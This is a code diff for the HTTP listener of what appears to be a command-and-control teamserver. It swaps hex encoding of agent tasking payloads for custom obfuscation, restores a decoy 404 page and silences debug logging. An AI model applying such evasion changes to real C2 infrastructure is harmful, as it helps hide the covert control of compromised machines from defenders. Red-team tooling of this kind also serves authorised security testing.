@@ -206,12 +206,13 @@ func (t *TransportHTTP) Start(ts Teamserver) error {
 	fmt.Printf("[DEBUG] GopherHTTP Listener Starting on %s:%d\n", t.Config.HostBind, t.Config.PortBind)
 	var err error = nil
 
-	gin.SetMode(gin.DebugMode) // Change to DebugMode to see Gin logs
+	//gin.SetMode(gin.DebugMode) // Change to DebugMode to see Gin logs
+	gin.SetMode(gin.ReleaseMode) // Use ReleaseMode for cleaner output
 	router := gin.New()
-	// router.NoRoute(t.pageError) // Temporarily disable custom 404 to see Gin's default behavior
+	router.NoRoute(t.pageError) // Temporarily disable custom 404 to see Gin's default behavior
 
 	router.Use(func(c *gin.Context) {
-		fmt.Printf("[DEBUG] Middleware: Request %s %s\n", c.Request.Method, c.Request.URL.Path)
+		//fmt.Printf("[DEBUG] Middleware: Request %s %s\n", c.Request.Method, c.Request.URL.Path)
 		for header, value := range t.Config.ResponseHeaders {
 			c.Header(header, value)
 		}
@@ -335,7 +336,7 @@ func (t *TransportHTTP) processRequest(ctx *gin.Context) {
 	}
 
 	// 3. Decode Payload
-	encryptedBytes, err := hex.DecodeString(packet.Payload)
+	encryptedBytes, err := Deobfuscate(packet.Payload)
 	if err != nil {
 		t.pageError(ctx)
 		return
@@ -363,7 +364,7 @@ func (t *TransportHTTP) processRequest(ctx *gin.Context) {
 						tasksData, _ := Ts.TsAgentGetHostedAll(agentId, 2097152)
 						respPayload := ""
 						if len(tasksData) > 0 {
-							respPayload = hex.EncodeToString(tasksData)
+							respPayload = Obfuscate(tasksData)
 						}
 
 						// Respond OK with Tasks
@@ -426,7 +427,7 @@ func (t *TransportHTTP) processRequest(ctx *gin.Context) {
 		tasksData, _ := Ts.TsAgentGetHostedAll(agentIdHex, 2097152)
 		respPayload := ""
 		if len(tasksData) > 0 {
-			respPayload = hex.EncodeToString(tasksData)
+			respPayload = Obfuscate(tasksData)
 		}
 
 		ctx.JSON(200, TelemetryPacket{
